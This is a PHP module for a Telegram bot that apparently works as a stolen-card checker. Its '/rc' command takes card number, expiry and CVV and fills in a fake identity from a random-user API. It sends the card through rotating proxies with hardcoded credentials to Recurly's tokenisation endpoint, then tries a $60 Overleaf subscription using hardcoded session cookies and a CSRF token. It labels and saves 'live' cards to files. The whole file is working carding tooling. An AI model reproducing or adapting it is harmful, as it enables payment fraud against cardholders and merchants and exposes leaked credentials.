<?php

//=====================[ RECURLY AUTH (60$) ]======================//
#-----------[SITE: https://www.overleaf.com/user/subscription/]-----------#


if ((strpos($message, "/rc") === 0) || (strpos($message, "!rc") === 0)){
  
  if (in_array($userId, $premium_users) === false){
 	sendMessage($chatId,$premium_unauth_msg, $message_id);
	return;
	}
  
  
$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
if (strlen($mes) == 1) $mes = "0$mon";
if (strlen($ano) == 4) $ano = substr($ano, 2, 2);


//==================[BIN LOOK-UP]======================//

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";
curl_close($ch);


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


//=======================[Proxys]=============================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}



//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.recurly.com/js/v1/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.recurly.com',
'method: POST',
'path: /js/v1/token',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://api.recurly.com',
'referer: https://api.recurly.com/js/v1/field.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first_name='.$name.'&last_name='.$last.'&country=US&state='.$state.'&postal_code='.$zip.'&city='.urlencode($city).'&address1='.urlencode($street).'&address2=&number='.$cc.'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-GB&browser[referrer_url]=https%3A%2F%2Fsubs.huracanapps.com%2Fsubscription&browser[screen_height]=864&browser[screen_width]=1536&browser[time_zone_offset]=-330&browser[user_agent]=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'&version=4.21.1&key=ewr1-sZ5kHl1Ew6Vr7o0bYpMFGc&deviceId=H4I9AJy7tK7jKtOG&sessionId=R823dv59V9RO5qZt&instanceId=eSfN4fXkKWQTJ2vj');
$res1 = curl_exec($ch);
$id = trim(strip_tags(getStr($res1,'"id":"','"')));
$msg1 = trim(strip_tags(getStr($res1,'"message":"','"')));


if (strpos($res1, "error")){
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
  curl_close($ch);

    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$res1.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
    return;
}


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.overleaf.com/user/subscription/create');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.overleaf.com',
'method: POST',
'path: /user/subscription/create',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'cookie: GCLB=CLuV0MaR4N_82wE; _gid=GA1.2.403102443.1642458439; overleaf_session2=s%3Ak5XeaGKVFuzJ489wzgq6vKdJrVCyMmEo.gVE4Z8hc%2BnnU1zX5JqZBLiFq9uD9QRxlsCtpbbdq1e8; _ga_RV4YBCCCWJ=GS1.1.1642458437.1.1.1642458585.0; _ga=GA1.1.1476499663.1642458437; _gat=1',
'origin: https://www.overleaf.com',
'referer: https://www.overleaf.com/user/subscription/new?planCode=student-annual&scf=true&cc=wfh2021student30',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"_csrf":"VF3oYGoW-yCRriaw_oNATzizDSMVdyEtNo3Q","recurly_token_id":"'.$id.'","subscriptionDetails":{"currencyCode":"USD","plan_code":"student-annual","coupon_code":"wfh2021student30","first_name":"'.$name.'","last_name":"'.$last.'","isPaypal":false,"address":{"address1":"'.$street.'","address2":"","country":"US","state":"","zip":"'.$postcode.'"},"ITMCampaign":"","ITMContent":""}}');

$result2 = curl_exec($ch);
$error = trim(strip_tags(getStr($result2,'"code":"','"')));
$msg = trim(strip_tags(getStr($result2,'"message":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);



//==================[Responses]======================//

if ((strpos($result2, 'Created')) || (strpos($result2, "Create")) || (strpos($result2, "create"))){
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Charged 60$</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
		file_put_contents('save/ccc.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
	}

elseif ((strpos($result2, 'The card has insufficient funds to cover the cost of the transaction.')) || (strpos($result2, 'insufficient_funds'))){
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$error.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
		file_put_contents('save/insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
	}

elseif ((strpos($result2, "fraud_security_code")) || (strpos($result2, "because the security code (CVV)"))){
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$error.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
		file_put_contents('save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
	}

else{
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$error.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
	}


curl_close($ch);
unlink("cookies.txt");
}

//====================[ RECURLY AUTH 60$ ]=====================//

?>